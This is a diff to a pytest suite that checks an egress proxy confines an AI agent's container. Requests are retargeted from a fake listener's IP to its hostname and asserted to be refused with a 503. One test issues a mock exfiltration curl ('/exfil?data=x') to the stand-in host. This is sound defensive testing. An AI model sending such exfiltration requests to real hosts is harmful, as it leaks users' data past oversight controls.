@@ -87,6 +87,7 @@ print(json.dumps({kind: sorted(ports) for kind, ports in found.items()}))
 class Fake:
     name: str
     ip: str
+    host: str = "listener.fake.test"  # its name: the gate refuses an IP literal that is private
 
     def accepts(self) -> list[str]:
         return docker.run(["exec", self.name, "cat", "/tmp/accepts"]).stdout.split()
@@ -96,6 +97,11 @@ class Fake:
 def proxy(running_agent) -> ProxyJail:
     assert running_agent.proxy is not None
     return running_agent.proxy
+
+
+# The listener's name on the egress network. Asked by name, a request reaches the gate's hooks
+# (no channel: 503); by its private IP, the CONNECT itself is refused (T06-5: private_address).
+FAKE_NAME = "listener.fake.test"
 
 
 @pytest.fixture(scope="module")
@@ -118,6 +124,8 @@ def fake(proxy: ProxyJail) -> Iterator[Fake]:
             "/tmp:rw,size=1m",
             "--network",
             proxy.config.network,
+            "--network-alias",
+            FAKE_NAME,
             "--memory",
             "128m",
             "--pids-limit",
@@ -306,7 +314,7 @@ def test_curl_goes_through_the_proxy_trusts_its_ca_and_is_refused(
     before = fake.accepts()
     result = running_agent.exec(
         ["curl", "-sS", "-v", "--max-time", "20", "-w", "\nstatus=%{http_code}",
-         f"{scheme}://{fake.ip}/exfil?data=x"],
+         f"{scheme}://{fake.host}/exfil?data=x"],
         timeout=60,
     )  # fmt: skip
     assert result.returncode == 0, docker.sanitize(result.stderr[-2000:])
@@ -322,7 +330,7 @@ def test_node_and_python_go_through_the_proxy_too(running_agent, fake: Fake) -> 
     (HTTPS_PROXY, SSL_CERT_FILE): both verify the proxy's certificate and get its 503."""
     before = fake.accepts()
     node = running_agent.exec(
-        ["node", "-e", f"fetch('https://{fake.ip}/n').then(r => console.log(r.status))"],
+        ["node", "-e", f"fetch('https://{fake.host}/n').then(r => console.log(r.status))"],
         timeout=60,
     )
     assert node.stdout.strip() == "503", docker.sanitize(node.stdout + node.stderr)
@@ -330,7 +338,7 @@ def test_node_and_python_go_through_the_proxy_too(running_agent, fake: Fake) -> 
         [
             "python3", "-c",
             "import urllib.request as u, urllib.error as e\n"
-            f"try: u.urlopen('https://{fake.ip}/p', timeout=20)\n"
+            f"try: u.urlopen('https://{fake.host}/p', timeout=20)\n"
             "except e.HTTPError as error: print(error.code)",
         ],
         timeout=60,
@@ -457,7 +465,7 @@ def test_http2_inside_connect_is_refused_too(running_agent, fake: Fake) -> None:
     before = fake.accepts()
     result = running_agent.exec(
         ["curl", "-sS", "--http2", "--max-time", "20", "-o", "/dev/null",
-         "-w", "%{http_code} %{http_version}", f"https://{fake.ip}/h2"],
+         "-w", "%{http_code} %{http_version}", f"https://{fake.host}/h2"],
         timeout=60,
     )  # fmt: skip
     assert result.stdout.strip() == "503 2", docker.sanitize(result.stdout + result.stderr)
